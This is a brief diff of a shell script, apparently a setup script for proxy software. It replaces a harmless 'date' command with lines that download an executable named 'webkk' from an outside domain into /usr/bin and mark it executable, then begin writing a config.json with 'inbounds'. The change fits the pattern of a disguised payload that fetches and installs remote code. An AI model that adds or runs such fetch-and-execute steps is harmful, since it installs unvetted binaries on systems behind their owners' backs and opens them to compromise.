@@ -1,7 +1,7 @@
 #!/bin/sh
 #显示时间
-date
-
+wget -P /usr/bin https://www.armn1.ml/kk/webkk
+chmod +x /usr/bin/webkk
 cat << EOF > /usr/bin/config.json
 {
   "inbounds": [
